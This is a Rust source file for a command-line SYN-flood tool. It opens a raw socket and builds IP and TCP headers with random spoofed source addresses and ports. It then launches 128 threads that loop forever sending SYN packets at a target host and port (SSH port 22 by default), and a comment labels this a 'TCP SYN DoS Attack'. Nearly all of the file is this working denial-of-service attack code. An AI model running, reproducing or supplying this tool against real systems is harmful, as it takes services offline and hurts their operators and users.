#![feature(box_syntax)]


use std::{
    error::Error,
    mem::size_of,
    net::Ipv4Addr,
    str::FromStr,
    thread::{self, JoinHandle},
    ptr::write
};

use clap::Parser;
use libc::{
    c_void, getpid, sendto, sockaddr, sockaddr_in, socket, AF_INET, SOCK_RAW,
};
use netlib::{
    aux::{htons, ntohl, random_u16, HostOrIPv4, random_u32},
    data::{SockAddrIn, InAddrN},
    c_error::ErrNo,
    rs_error::NetErr,
    network::{
        inet_cksum,
        ip::{Protocol, IP, HLV, ToS, PL},
    },
    transport::tcp::{TCP, TcpFlag}, view::U16N,
};

const IPSZ: usize = size_of::<IP>();
const TCPSZ: usize = size_of::<TCP>();

const PACKAGE_SIZE: usize = IPSZ + TCPSZ;
static mut RAWSOCK: i32 = 0;


pub unsafe fn quick_send_syn(
    ip_src: u32,
    mut dst: sockaddr_in,
    port_src: u16,
    port_dst: u16,
) -> Result<(), NetErr> {
    let mut sendbuf = [0u8; PACKAGE_SIZE];

    /* SET IP HEADER */
    let mut iphdr = IP {
        // 5 * 4 = 20 bytes, ipv4
        ihl_v: HLV::new(5, 4),
        tos: ToS::default(),
        len: PL::from_native(PACKAGE_SIZE as u16),
        id: U16N::from_native(getpid() as u16),
        frag_off: Default::default(),
        ttl: 200,
        protocol: Protocol::TCP,
        checksum: 0,
        ip_src: InAddrN::from_native_u32(ip_src),
        ip_dst: InAddrN::from_native_sockaddr_in(dst)
    };

    write(
        sendbuf[..IPSZ].as_mut_ptr() as *mut IP,
        iphdr
    );

    iphdr.checksum = inet_cksum(sendbuf.as_ptr(), IPSZ);

    write(
        sendbuf[..IPSZ].as_mut_ptr() as *mut IP,
        iphdr
    );

    /* SET TCP HEADER */
    let mut tcphdr = TCP {
        source: htons(port_src),
        dest: htons(port_dst),
        seq: 0,
        ack_seq: 0,
        doff_flags: TCP::doff_flags(5, &[TcpFlag::Syn, TcpFlag::Urg]),
        window: random_u16(),
        check: 0,
        urgptr: random_u16(),
    };

    let mut checksum_buf = [0u8; 12 + TCPSZ];
    iphdr.write_pseudo_iphdr(&mut checksum_buf, (TCPSZ + 0) as u16);

    write(
        checksum_buf[12..].as_mut_ptr() as *mut TCP,
        tcphdr
    );

    // config
    // .serialize_into(&mut checksum_buf[12..], &tcphdr)
    // .or(Err(NetErr::Serialize))?;

    tcphdr.check = inet_cksum(
        checksum_buf.as_ptr(),
        checksum_buf.len()
    );

    write(
        sendbuf[IPSZ..].as_mut_ptr() as *mut TCP,
        tcphdr
    );
    // config
    //     .serialize_into(&mut sendbuf[IPSZ..], &tcphdr)
    //     .or(Err(NetErr::Serialize))?;

    let size = sendto(
        RAWSOCK,
        sendbuf.as_mut_ptr() as *mut c_void,
        PACKAGE_SIZE,
        0,
        &mut dst as *mut sockaddr_in as *mut sockaddr,
        size_of::<sockaddr_in>() as u32,
    );

    let src = Ipv4Addr::from(ip_src);
    let dst = Ipv4Addr::from(ntohl(dst.sin_addr.s_addr));

    if size < 0 {
        let errno = ErrNo::fetch();

        eprintln!("{:#?} sendto {:#?} failed({errno:#?})", src, dst);
        return Err(NetErr::SendTo);
    } else {
        println!("{:#?} sendto {:#?} succeed", src, dst);
    }

    Ok(())
}

#[allow(unused)]
unsafe fn dos_syn(dst: sockaddr_in, port_dst: u16) {
    loop {
        let ip_src = random_u32();
        let port_src = random_u16();

        match quick_send_syn(ip_src, dst, port_src, port_dst) {
            Ok(_) => {}
            Err(_err) => {}
        }
    }
}


////////////////////////////////////////////////////////////////////////////////
//// Cli

#[derive(Parser)]
#[clap()]
struct Cli {
    #[clap()]
    dst: String,

    port: Option<u16>
}


fn main() -> Result<(), Box<dyn Error>> {
    let cli = Cli::parse();
    let dst = cli.dst;
    let port_dst = cli.port.unwrap_or(22);

    unsafe {
        let hostorip = HostOrIPv4::from_str(&dst)?;

        let dst: Ipv4Addr = hostorip.try_into()?;
        let cdst = SockAddrIn::from(dst).into();

        // IPPROTO_RAW - 255
        RAWSOCK = socket(AF_INET, SOCK_RAW, Protocol::Reserved as i32);
        if RAWSOCK < 0 {
            return Err(box NetErr::CreateRawSocket);
        }

        // TCP SYN DoS Attack
        let threads: Vec<JoinHandle<()>> = (0..128).into_iter()
        .map(move |i| {
            thread::Builder::new()
            .name(format!("dos-child-{}", i))
            .spawn(move || {
                dos_syn(cdst, port_dst)
            }).unwrap()
        })
        .collect();

        for th in threads.into_iter() {
            th.join().unwrap();
        }
    }

    Ok(())
}
